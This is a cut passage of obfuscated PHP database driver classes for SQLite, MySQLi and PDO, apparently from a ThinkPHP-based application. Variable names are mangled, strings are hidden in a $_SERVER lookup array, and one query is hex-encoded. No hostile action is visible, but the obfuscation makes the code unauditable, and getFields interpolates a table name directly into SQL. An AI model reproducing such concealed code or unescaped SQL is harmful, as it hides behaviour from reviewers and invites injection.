$Êİß•¦ = explode($şŞèğÁ[8], $¸·ÇÓ¿é); for ($Øìé‹²ì = 0; $Øìé‹²ì < count($Êİß•¦); $Øìé‹²ì++) { if ($Êİß•¦[$Øìé‹²ì] != $¤Æôâ[$ÖñÊ‡ê  + $Øìé‹²ì]) { $÷„Ö†Ö = !1; break; } } if (!$÷„Ö†Ö) { return; } call_user_func_array(array($this, $Š‚Ü÷ŒÙ), array()); } public function routeArgs($õ·½’íĞ = 3) { $«Œªı†ƒ = $this->in[$_SERVER[”ú…±Ú¥][9]]; if (count($«Œªı†ƒ) <= $õ·½’íĞ) { return array(); } $§³á±ïİ = array(); for ($£âĞà¿ = $õ·½’íĞ; $£âĞà¿ < count($«Œªı†ƒ); $£âĞà¿ += 2) { $§³á±ïİ[$«Œªı†ƒ[$£âĞà¿]] = $«Œªı†ƒ[$£âĞà¿ + 1]; $this->in[$«Œªı†ƒ[$£âĞà¿]] = $«Œªı†ƒ[$£âĞà¿ + 1]; } return $§³á±ïİ; } protected function assign($§”¨ÅïÅ, $é‡Ì†›ä) { $this->values[$§”¨ÅïÅ] = $é‡Ì†›ä; } protected function display($Ÿ¿‹™) { ob_end_clean(); extract($this->values); require $this->tpl . $Ÿ¿‹™; } } class DbSqliteBase extends Db { public function __construct($Ñ öü—— = '') { $ş´¥«Ş­ =& $_SERVER[”ú…±Ú¥]; if (!extension_loaded($ş´¥«Ş­[13])) { think_exception(think_lang($ş´¥«Ş­[14]) . $ş´¥«Ş­[15]); } if (!empty($Ñ öü——)) { if (!isset($Ñ öü——[$ş´¥«Ş­[16]])) { $Ñ öü——[$ş´¥«Ş­[16]] = 438; } $this->config = $Ñ öü——; if (empty($this->config[$ş´¥«Ş­[17]])) { $this->config[$ş´¥«Ş­[17]] = array(); } } } public function connect($÷¯ÁñäÎ = '', $š¥©æ³Ğ = 0) { $îÓ”Ù†° =& $_SERVER[”ú…±Ú¥]; if (!isset($this->linkID[$š¥©æ³Ğ])) { if (empty($÷¯ÁñäÎ)) { $÷¯ÁñäÎ = $this->config; } $Ïêã¸è = !empty($÷¯ÁñäÎ[$îÓ”Ù†°[17]][$îÓ”Ù†°[18]]) ? $÷¯ÁñäÎ[$îÓ”Ù†°[17]][$îÓ”Ù†°[18]] : $this->pconnect; $™õ«ª§§ = $Ïêã¸è ? $îÓ”Ù†°[19] : $îÓ”Ù†°[20]; $this->linkID[$š¥©æ³Ğ] = $™õ«ª§§($÷¯ÁñäÎ[$îÓ”Ù†°[21]], $÷¯ÁñäÎ[$îÓ”Ù†°[16]]); if (!$this->linkID[$š¥©æ³Ğ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$š¥©æ³Ğ], 30000); if (1 != think_config($îÓ”Ù†°[22])) { unset($this->config); } } return $this->linkID[$š¥©æ³Ğ]; } public function free() { $this->queryID = null; } public function query($»ó‡’«) { $¶ÕÊŞôÌ =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»ó‡’«; if ($this->queryID) { $this->free(); } think_action_status($¶ÕÊŞôÌ[23], 1); think_status($¶ÕÊŞôÌ[24]); $this->queryID = sqlite_query($this->_linkID, $»ó‡’«); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÍéÀ„˜† = $this->getAll(); return $ÍéÀ„˜†; } } public function execute($’Âğ¼Õ) { $ ¨Ó¦£ =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’Âğ¼Õ; if ($this->queryID) { $this->free(); } think_action_status($ ¨Ó¦£[25], 1); think_status($ ¨Ó¦£[24]); $´“²Ú¨€ = sqlite_exec($this->_linkID, $’Âğ¼Õ); $this->debug(); if (!1 === $´“²Ú¨€) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[”ú…±Ú¥][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯‡ˆ¤‹è = sqlite_query($this->_linkID, $_SERVER[”ú…±Ú¥][27]); if (!$¯‡ˆ¤‹è) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷ËÉƒì = sqlite_query($this->_linkID, $_SERVER[”ú…±Ú¥][28]); if (!$÷ËÉƒì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $­¢áú¾ = array(); if ($this->numRows > 0) { for ($•µŸ®º¶ = 0; $•µŸ®º¶ < $this->numRows; $•µŸ®º¶++) { $­¢áú¾[$•µŸ®º¶] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $­¢áú¾; } public function getFields($Ş‚¶œ›Í) { $—…†²Ü² =& $_SERVER[”ú…±Ú¥]; $èÛÓŒç¼ = $this->query($—…†²Ü²[29] . $Ş‚¶œ›Í . $—…†²Ü²[30]); $¬Æ€”åÔ = array(); if ($èÛÓŒç¼) { foreach ($èÛÓŒç¼ as $ş•˜±ºÏ => $³Ó–ûø®) { $¬Æ€”åÔ[$³Ó–ûø®[$—…†²Ü²[31]]] = array($—…†²Ü²[32] => $³Ó–ûø®[$—…†²Ü²[31]], $—…†²Ü²[33] => $³Ó–ûø®[$—…†²Ü²[34]], $—…†²Ü²[35] => (bool) ($³Ó–ûø®[$—…†²Ü²[36]] === $—…†²Ü²[12]), $—…†²Ü²[37] => $³Ó–ûø®[$—…†²Ü²[38]], $—…†²Ü²[39] => strtolower($³Ó–ûø®[$—…†²Ü²[40]]) == $—…†²Ü²[41], $—…†²Ü²[42] => strtolower($³Ó–ûø®[$—…†²Ü²[43]]) == $—…†²Ü²[44]); } } return $¬Æ€”åÔ; } public function getTables($Ö¸© £÷ = '') { $º±¢èÄ– =& $_SERVER[”ú…±Ú¥]; $´ÂŞœöş = $this->query($º±¢èÄ–[45] . $º±¢èÄ–[46] . $º±¢èÄ–[47]); $ûŠ¦‹™Ø = array(); foreach ($´ÂŞœöş as $€××æò => $óº³¢§) { $ûŠ¦‹™Ø[$€××æò] = current($óº³¢§); } return $ûŠ¦‹™Ø; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‚—çÌ¼ =& $_SERVER[”ú…±Ú¥]; $ø¸•ôõÄ = sqlite_last_error($this->_linkID); $this->error = $ø¸•ôõÄ . $‚—çÌ¼[4] . sqlite_error_string($ø¸•ôõÄ); if ($‚—çÌ¼[12] != $this->queryStr) { $this->error .= LNG($‚—çÌ¼[48]) . $this->queryStr; } think_trace($this->error, $‚—çÌ¼[12], $‚—çÌ¼[49]); return $this->error; } public function escapeString($¤Æ¸˜¸®) { return sqlite_escape_string($¤Æ¸˜¸®); } public function parseLimit($æÇĞ„ê) { $ÆÄ‘Î–ã =& $_SERVER[”ú…±Ú¥]; $ƒÖğ¡ÏŞ = $ÆÄ‘Î–ã[12]; if (!empty($æÇĞ„ê)) { $æÇĞ„ê = explode($ÆÄ‘Î–ã[50], $æÇĞ„ê); if (count($æÇĞ„ê) > 1) { $ƒÖğ¡ÏŞ .= $ÆÄ‘Î–ã[51] . $æÇĞ„ê[1] . $ÆÄ‘Î–ã[52] . $æÇĞ„ê[0] . $ÆÄ‘Î–ã[53]; } else { $ƒÖğ¡ÏŞ .= $ÆÄ‘Î–ã[51] . $æÇĞ„ê[0] . $ÆÄ‘Î–ã[53]; } } return $ƒÖğ¡ÏŞ; } } class DbSqlite3Base extends Db { public function __construct($ù½Ú˜¬ = '') { $¢í¢øò =& $_SERVER[”ú…±Ú¥]; if (!class_exists($¢í¢øò[54])) { think_exception(think_lang($¢í¢øò[14]) . $¢í¢øò[55]); } if (!empty($ù½Ú˜¬)) { if (!isset($ù½Ú˜¬[$¢í¢øò[16]])) { $ù½Ú˜¬[$¢í¢øò[16]] = 438; } $this->config = $ù½Ú˜¬; if (empty($this->config[$¢í¢øò[17]])) { $this->config[$¢í¢øò[17]] = array(); } } } public function connect($Ó°ÆÁÁ‡ = '', $™ÀÖ‡³ = 0) { $«¥•è¸£ =& $_SERVER[”ú…±Ú¥]; if (!isset($this->linkID[$™ÀÖ‡³])) { if (empty($Ó°ÆÁÁ‡)) { $Ó°ÆÁÁ‡ = $this->config; } $this->linkID[$™ÀÖ‡³] = new SQLite3($Ó°ÆÁÁ‡[$«¥•è¸£[21]]); if (!$this->linkID[$™ÀÖ‡³]) { think_exception($this->linkID[$™ÀÖ‡³]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$™ÀÖ‡³]->busyTimeout(30000); if (1 != think_config($«¥•è¸£[22])) { unset($this->config); } } return $this->linkID[$™ÀÖ‡³]; } public function free() { $this->queryID = null; } public function query($¬ôÅ´ÂË) { $ï•É¢“Œ =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¬ôÅ´ÂË; if ($this->queryID) { $this->free(); } think_action_status($ï•É¢“Œ[23], 1); think_status($ï•É¢“Œ[24]); $this->queryID = $this->_linkID->query($¬ôÅ´ÂË); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Œ‰«³ö‡ = $this->getAll(); $this->numRows = count($Œ‰«³ö‡); return $Œ‰«³ö‡; } } public function execute($±÷©€ÎÅ) { $º‘¹ÈÖò =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±÷©€ÎÅ; if ($this->queryID) { $this->free(); } think_action_status($º‘¹ÈÖò[25], 1); think_status($º‘¹ÈÖò[24]); $¢É¢›ïÕ = $this->_linkID->exec($±÷©€ÎÅ); $this->debug(); if (!1 === $¢É¢›ïÕ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[”ú…±Ú¥][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $²Ì˜ê»– = $this->_linkID->query($_SERVER[”ú…±Ú¥][27]); if (!$²Ì˜ê»–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ñ•Œ“±§ = $this->_linkID->query($_SERVER[”ú…±Ú¥][28]); if (!$ñ•Œ“±§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ ì¿ƒç = array(); while ($ôÀüÌºë = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ ì¿ƒç[] = $ôÀüÌºë; } $this->queryID->reset(); return $ ì¿ƒç; } public function getFields($ğ¦é–ãù) { $…·á÷·× =& $_SERVER[”ú…±Ú¥]; $Æå ÌÁ´ = $this->query($…·á÷·×[29] . $ğ¦é–ãù . $…·á÷·×[30]); $ıºéàÂ = array(); if ($Æå ÌÁ´) { foreach ($Æå ÌÁ´ as $ëÒ“ä¸˜ => $˜ŸçµÂÃ) { $ıºéàÂ[$˜ŸçµÂÃ[$…·á÷·×[32]]] = array($…·á÷·×[32] => $˜ŸçµÂÃ[$…·á÷·×[32]], $…·á÷·×[33] => $˜ŸçµÂÃ[$…·á÷·×[33]], $…·á÷·×[35] => (bool) ($˜ŸçµÂÃ[$…·á÷·×[35]] === $…·á÷·×[12]), $…·á÷·×[37] => $˜ŸçµÂÃ[$…·á÷·×[56]], $…·á÷·×[39] => (bool) $˜ŸçµÂÃ[$…·á÷·×[57]], $…·á÷·×[42] => (bool) $˜ŸçµÂÃ[$…·á÷·×[57]]); } } return $ıºéàÂ; } public function getTables($‰Æ¤Ğ» = '') { $ï™ì®œ =& $_SERVER[”ú…±Ú¥]; $Û•ñôåÙ = $this->query($ï™ì®œ[45] . $ï™ì®œ[46] . $ï™ì®œ[47]); $–ëŞŸá« = array(); foreach ($Û•ñôåÙ as $ÉÒèÛ€É => $¯Ó­óèØ) { $–ëŞŸá«[$ÉÒèÛ€É] = current($¯Ó­óèØ); } return $–ëŞŸá«; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $³¸±ı =& $_SERVER[”ú…±Ú¥]; $this->error = $this->_linkID->lastErrorMsg(); if ($³¸±ı[12] != $this->queryStr) { $this->error .= LNG($³¸±ı[48]) . $this->queryStr; } think_trace($this->error, $³¸±ı[12], $³¸±ı[49]); return $this->error; } public function escapeString($–çù•çê) { $ÓÁŸ”¥¥ =& $_SERVER[”ú…±Ú¥]; if ($this->_linkID) { return $this->_linkID->escapeString($–çù•çê); } return str_ireplace($ÓÁŸ”¥¥[58], $ÓÁŸ”¥¥[59], $–çù•çê); } public function parseLimit($ä•–‡²¼) { $íé‹Š‹ú =& $_SERVER[”ú…±Ú¥]; $”Ùòôƒï = $íé‹Š‹ú[12]; if (!empty($ä•–‡²¼)) { $ä•–‡²¼ = explode($íé‹Š‹ú[50], $ä•–‡²¼); if (count($ä•–‡²¼) > 1) { $”Ùòôƒï .= $íé‹Š‹ú[51] . $ä•–‡²¼[1] . $íé‹Š‹ú[52] . $ä•–‡²¼[0] . $íé‹Š‹ú[53]; } else { $”Ùòôƒï .= $íé‹Š‹ú[51] . $ä•–‡²¼[0] . $íé‹Š‹ú[53]; } } return $”Ùòôƒï; } } goto Aé‰Ù»Éµ’; d›®Ğëï—ª: class DbMysqli extends Db { public function __construct($Øïã“ÀÎ = '') { $šğÄ¹Şå =& $_SERVER[”ú…±Ú¥]; if (!extension_loaded($šğÄ¹Şå[941])) { think_exception(think_lang($šğÄ¹Şå[14]) . $šğÄ¹Şå[942]); } if (!empty($Øïã“ÀÎ)) { $this->config = $Øïã“ÀÎ; if (empty($this->config[$šğÄ¹Şå[17]])) { $this->config[$šğÄ¹Şå[17]] = $šğÄ¹Şå[12]; } } } public function connect($î¦àŒéø = '', $ƒ›´šú = 0) { $ùôÎáÔá =& $_SERVER[”ú…±Ú¥]; if (!isset($this->linkID[$ƒ›´šú])) { if (empty($î¦àŒéø)) { $î¦àŒéø = $this->config; } $this->linkID[$ƒ›´šú] = new mysqli($î¦àŒéø[$ùôÎáÔá[915]], $î¦àŒéø[$ùôÎáÔá[917]], $î¦àŒéø[$ùôÎáÔá[918]], $î¦àŒéø[$ùôÎáÔá[21]], $î¦àŒéø[$ùôÎáÔá[916]] ? intval($î¦àŒéø[$ùôÎáÔá[916]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ø·´‰Üê = $this->linkID[$ƒ›´šú]->server_version; $this->linkID[$ƒ›´šú]->query($ùôÎáÔá[919] . think_config($ùôÎáÔá[920]) . $ùôÎáÔá[58]); if ($Ø·´‰Üê > $ùôÎáÔá[921]) { $this->linkID[$ƒ›´šú]->query($ùôÎáÔá[922]); } $this->connected = !0; if (1 != think_config($ùôÎáÔá[22])) { unset($this->config); } } return $this->linkID[$ƒ›´šú]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ù‚¦‡Ù) { $øÏ³åò• =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù‚¦‡Ù; if ($this->queryID) { $this->free(); } think_action_status($øÏ³åò•[23], 1); think_status($øÏ³åò•[24]); $this->queryID = $this->_linkID->query($Ù‚¦‡Ù); if ($this->_linkID->more_results()) { while (($š¡Ÿ´±¥ = $this->_linkID->next_result()) != NULL) { $š¡Ÿ´±¥->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($©üğ…ï) { $Ü¹ûÆÅŸ =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©üğ…ï; if ($this->queryID) { $this->free(); } think_action_status($Ü¹ûÆÅŸ[25], 1); think_status($Ü¹ûÆÅŸ[24]); $òòÜšã = $this->_linkID->query($©üğ…ï); $this->debug(); if (!1 === $òòÜšã) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Äâ”ÁÎÊ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Äâ”ÁÎÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Öª‡À‚À = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Öª‡À‚À) { $this->error(); return !1; } } return !0; } private function getAll() { $ –÷©¸“ = array(); if ($this->numRows > 0) { for ($ú³»Ø—Ã = 0; $ú³»Ø—Ã < $this->numRows; $ú³»Ø—Ã++) { $ –÷©¸“[$ú³»Ø—Ã] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ –÷©¸“; } public function getFields($×Íİæôú) { $¹ä—ßë¾ =& $_SERVER[”ú…±Ú¥]; $Ú÷ª–ñÒ = $this->query($¹ä—ßë¾[926] . $this->parseKey($×Íİæôú)); $õıÓŒ™¶ = array(); if ($Ú÷ª–ñÒ) { foreach ($Ú÷ª–ñÒ as $Šß‘äÛÙ => $‹’ôÉ‡œ) { $õıÓŒ™¶[$‹’ôÉ‡œ[$¹ä—ßë¾[31]]] = array($¹ä—ßë¾[32] => $‹’ôÉ‡œ[$¹ä—ßë¾[31]], $¹ä—ßë¾[33] => $‹’ôÉ‡œ[$¹ä—ßë¾[34]], $¹ä—ßë¾[35] => (bool) ($‹’ôÉ‡œ[$¹ä—ßë¾[36]] === $¹ä—ßë¾[12]), $¹ä—ßë¾[37] => $‹’ôÉ‡œ[$¹ä—ßë¾[38]], $¹ä—ßë¾[39] => strtolower($‹’ôÉ‡œ[$¹ä—ßë¾[40]]) == $¹ä—ßë¾[41], $¹ä—ßë¾[42] => strtolower($‹’ôÉ‡œ[$¹ä—ßë¾[43]]) == $¹ä—ßë¾[44]); } } return $õıÓŒ™¶; } public function getTables($©»›¥ñ  = '') { $°ºÑ¨¨ =& $_SERVER[”ú…±Ú¥]; $¢îãÈÛ³ = !empty($©»›¥ñ ) ? $°ºÑ¨¨[928] . $©»›¥ñ  . $°ºÑ¨¨[929] : $°ºÑ¨¨[930]; $ê¨ì…· = $this->query($¢îãÈÛ³); $ÙµÁ£Æà = array(); if ($ê¨ì…·) { foreach ($ê¨ì…· as $‰æ®„— => $ïÍó¶‚Æ) { $ÙµÁ£Æà[$‰æ®„—] = current($ïÍó¶‚Æ); } } return $ÙµÁ£Æà; } public function replace($ïºÇı¿ğ, $‹–»ôãª = array()) { $ªŒæ§·È =& $_SERVER[”ú…±Ú¥]; foreach ($ïºÇı¿ğ as $äùìâ±È => $ôº‰ı½ğ) { $ƒÙÁ©ä = $this->parseValue($ôº‰ı½ğ); if (is_scalar($ƒÙÁ©ä)) { $Ï§¢•Ğú[] = $ƒÙÁ©ä; $£éÒÊë±[] = $this->parseKey($äùìâ±È); } } $âèÎŒæØ = $ªŒæ§·È[931] . $this->parseTable($‹–»ôãª[$ªŒæ§·È[317]]) . $ªŒæ§·È[932] . implode($ªŒæ§·È[50], $£éÒÊë±) . $ªŒæ§·È[933] . implode($ªŒæ§·È[50], $Ï§¢•Ğú) . $ªŒæ§·È[934]; return $this->execute($âèÎŒæØ); } public function insertAll($ ¤°ÇüÎ, $òëÔ®à = array(), $†¯ßÒ™ = false) { $°½ú¯¸ =& $_SERVER[”ú…±Ú¥]; if (!is_array($ ¤°ÇüÎ[0])) { return !1; } $¸¯„Ì¨é = array_keys($ ¤°ÇüÎ[0]); $Ë¢”ú˜ = array(); foreach ($ ¤°ÇüÎ as $¢Ó†˜Ø) { $£¯¢ÎÆ = array(); foreach ($¢Ó†˜Ø as $µ¬Ë©±Í => $ÇÌÇ‹é°) { $ÇÌÇ‹é° = $this->parseValue($ÇÌÇ‹é°); if (is_scalar($ÇÌÇ‹é°)) { $£¯¢ÎÆ[] = $ÇÌÇ‹é°; } } $Ë¢”ú˜[] = $°½ú¯¸[298] . implode($°½ú¯¸[50], $£¯¢ÎÆ) . $°½ú¯¸[934]; } array_walk($¸¯„Ì¨é, array($this, $°½ú¯¸[935])); $ Ññö‚‰ = $†¯ßÒ™ ? $°½ú¯¸[936] : $°½ú¯¸[937]; $¸üÆ«Î© = $ Ññö‚‰ . $°½ú¯¸[938] . $this->parseTable($òëÔ®à[$°½ú¯¸[317]]) . $°½ú¯¸[932] . implode($°½ú¯¸[50], $¸¯„Ì¨é) . $°½ú¯¸[939] . implode($°½ú¯¸[50], $Ë¢”ú˜); return $this->execute($¸üÆ«Î©); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÄçÏ²Í =& $_SERVER[”ú…±Ú¥]; $this->error = $this->_linkID->errno . $ÄçÏ²Í[4] . $this->_linkID->error; if ($ÄçÏ²Í[12] != $this->queryStr) { $this->error .= LNG($ÄçÏ²Í[48]) . $this->queryStr; } think_trace($this->error, $ÄçÏ²Í[12], $ÄçÏ²Í[49]); return $this->error; } public function escapeString($ˆÛ‘‹¦°) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ˆÛ‘‹¦°); } else { return addslashes($ˆÛ‘‹¦°); } } public function parseKey(&$ôàÅ«û, $„ÅùÁÓ‘ = true) { $§ø–åæš =& $_SERVER[”ú…±Ú¥]; if ($„ÅùÁÓ‘) { $ôàÅ«û = $this->parseKeyCheck($ôàÅ«û); } if ($ôàÅ«û != $§ø–åæš[199] && !preg_match($§ø–åæš[940], $ôàÅ«û)) { $ôàÅ«û = $§ø–åæš[423] . trim($ôàÅ«û, $§ø–åæš[423]) . $§ø–åæš[423]; } return $ôàÅ«û; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ß‰¦ŸÑ» = '') { $Ã£ŠÎ‚Ê =& $_SERVER[”ú…±Ú¥]; if (!class_exists($Ã£ŠÎ‚Ê[943])) { think_exception(think_lang($Ã£ŠÎ‚Ê[14]) . $Ã£ŠÎ‚Ê[944]); } if (!empty($ß‰¦ŸÑ»)) { $this->config = $ß‰¦ŸÑ»; if (empty($this->config[$Ã£ŠÎ‚Ê[17]])) { $this->config[$Ã£ŠÎ‚Ê[17]] = array(); } } } public function connect($•Ü·°¤³ = '', $áÍ¾ãÉš = 0) { $ù¼Õ²İ =& $_SERVER[”ú…±Ú¥]; if (!isset($this->linkID[$áÍ¾ãÉš])) { if (empty($•Ü·°¤³)) { $•Ü·°¤³ = $this->config; } $Şáà¡÷ë = !empty($•Ü·°¤³[$ù¼Õ²İ[17]][$ù¼Õ²İ[18]]) ? $•Ü·°¤³[$ù¼Õ²İ[17]][$ù¼Õ²İ[18]] : $this->pconnect; if ($Şáà¡÷ë) { $•Ü·°¤³[$ù¼Õ²İ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$áÍ¾ãÉš] = new PDO($•Ü·°¤³[$ù¼Õ²İ[945]], $•Ü·°¤³[$ù¼Õ²İ[917]], $•Ü·°¤³[$ù¼Õ²İ[918]], $•Ü·°¤³[$ù¼Õ²İ[17]]); } catch (PDOException $¡¯šãâò) { think_exception($¡¯šãâò->getMessage()); } $this->dbType = $this->_getDsnType($•Ü·°¤³[$ù¼Õ²İ[945]]); if (in_array($this->dbType, array($ù¼Õ²İ[946], $ù¼Õ²İ[947], $ù¼Õ²İ[948], $ù¼Õ²İ[949]))) { think_exception($ù¼Õ²İ[950] . $this->dbType . $ù¼Õ²İ[951] . $this->dbType . $ù¼Õ²İ[952]); } if (!$this->linkID[$áÍ¾ãÉš]) { think_exception($ù¼Õ²İ[953]); } try { $this->linkID[$áÍ¾ãÉš]->exec($ù¼Õ²İ[954] . think_config($ù¼Õ²İ[920])); } catch (Exception $¡¯šãâò) { } $this->connected = !0; if (1 != think_config($ù¼Õ²İ[22])) { unset($this->config); } } return $this->linkID[$áÍ¾ãÉš]; } public function free() { $this->PDOStatement = null; } public function query($ã£¶àÕ¡, $§á¥ü = array()) { $«ÇµÃàş =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ã£¶àÕ¡; if (!empty($§á¥ü)) { $this->queryStr .= $«ÇµÃàş[955] . print_r($§á¥ü, !0) . $«ÇµÃàş[956]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($«ÇµÃàş[23], 1); think_status($«ÇµÃàş[24]); $this->PDOStatement = $this->_linkID->prepare($ã£¶àÕ¡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ùûê‹ŒÕ = $this->PDOStatement->execute($§á¥ü); $this->debug(); if (!1 === $Ùûê‹ŒÕ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ò½—óÛÃ, $Ó —¹ = array()) { $Óûü£¹ê =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò½—óÛÃ; if (!empty($Ó —¹)) { $this->queryStr .= $Óûü£¹ê[955] . print_r($Ó —¹, !0) . $Óûü£¹ê[956]; } $ï¶Æ°œÔ = !1; if ($this->dbType == $Óûü£¹ê[949]) { if (preg_match($Óûü£¹ê[957], $this->queryStr, $è·é™¤Æ)) { $this->table = think_config($Óûü£¹ê[958]) . str_ireplace(think_config($Óûü£¹ê[959]), $Óûü£¹ê[416], $è·é™¤Æ[2]); $ï¶Æ°œÔ = (bool) $this->query($Óûü£¹ê[960] . strtoupper($this->table) . $Óûü£¹ê[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Óûü£¹ê[25], 1); think_status($Óûü£¹ê[24]); $this->PDOStatement = $this->_linkID->prepare($Ò½—óÛÃ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Œ•˜¨à÷ = $this->PDOStatement->execute($Ó —¹); $this->debug(); if (!1 === $Œ•˜¨à÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ï¶Æ°œÔ || preg_match($Óûü£¹ê[961], $Ò½—óÛÃ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $œ¦©ã¦Â = $this->_linkID->commit(); $this->transTimes = 0; if (!$œ¦©ã¦Â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ş£å”µÈ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ş£å”µÈ) { $this->error(); return !1; } } return !0; } private function getAll() { $¹«Şªò´ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¹«Şªò´); return $¹«Şªò´; } public function getFields($Å‹õå) { $®ñ¡Üº =& $_SERVER[”ú…±Ú¥]; $this->initConnect(!0); if (think_config($®ñ¡Üº[962])) { $Øíøá”Á = str_replace($®ñ¡Üº[963], $Å‹õå, think_config($®ñ¡Üº[962])); } else { switch ($this->dbType) { case $®ñ¡Üº[946]: case $®ñ¡Üº[964]: $Øíøá”Á = "\123\x45\x4c\105\x43\124\x20\40\x20\143\x6f\154\x75\x6d\156\x5f\x6e\x61\x6d\145\x20\x61\163\x20\47\x4e\x61\x6d\145\47\54\40\40\40\144\141\x74\x61\x5f\x74\x79\x70\x65\x20\141\163\40\x27\124\171\x70\x65\x27\54\x20\x20\x20\143\157\x6c\165\155\156\x5f\x64\x65\x66\x61\165\154\164\40\141\163\40\x27\104\145\x66\141\x75\154\164\47\x2c\40\x20\x20\x69\x73\x5f\x6e\165\x6c\x6c\141\142\154\x65\40\141\163\40\47\116\165\154\154\x27\12\x9\x9\106\x52\x4f\x4d\x9\x69\x6e\146\x6f\162\155\141\x74\151\x6f\156\x5f\x73\x63\150\145\155\141\x2e\x74\x61\x62\154\145\x73\x20\101\123\x20\x74\xa\x9\11\x4a\x4f\x49\x4e\11\151\156\x66\157\162\155\141\164\x69\x6f\x6e\x5f\x73\x63\150\145\155\141\x2e\x63\157\154\165\155\156\x73\40\101\x53\x20\143\xa\x9\x9\x4f\116\x20\x20\x74\56\x74\x61\x62\154\145\137\143\x61\164\x61\154\157\147\x20\x3d\x20\x63\x2e\164\141\x62\x6c\x65\x5f\143\x61\x74\141\154\157\147\12\x9\11\101\116\x44\40\x74\56\164\x61\142\x6c\x65\x5f\163\x63\x68\145\x6d\141\x20\x3d\x20\x63\56\164\141\x62\x6c\x65\x5f\x73\143\150\x65\x6d\141\xa\x9\11\x41\116\x44\x20\x74\x2e\x74\x61\142\154\x65\137\156\x61\x6d\x65\40\75\40\143\x2e\x74\x61\142\154\x65\x5f\x6e\141\155\145\xa\x9\x9\127\110\105\122\x45\x20\x20\40\x74\56\x74\141\142\154\x65\137\x6e\x61\155\x65\40\x3d\x20\x27{$Å‹õå}\47"; break; case $®ñ¡Üº[965]: $Øíøá”Á = $®ñ¡Üº[966] . $Å‹õå . $®ñ¡Üº[967]; break; case $®ñ¡Üº[947]: case $®ñ¡Üº[949]: $Øíøá”Á = $®ñ¡Üº[968] . $®ñ¡Üº[969] . $®ñ¡Üº[970] . strtoupper($Å‹õå) . $®ñ¡Üº[971] . strtoupper($Å‹õå) . $®ñ¡Üº[972]; break; case $®ñ¡Üº[973]: 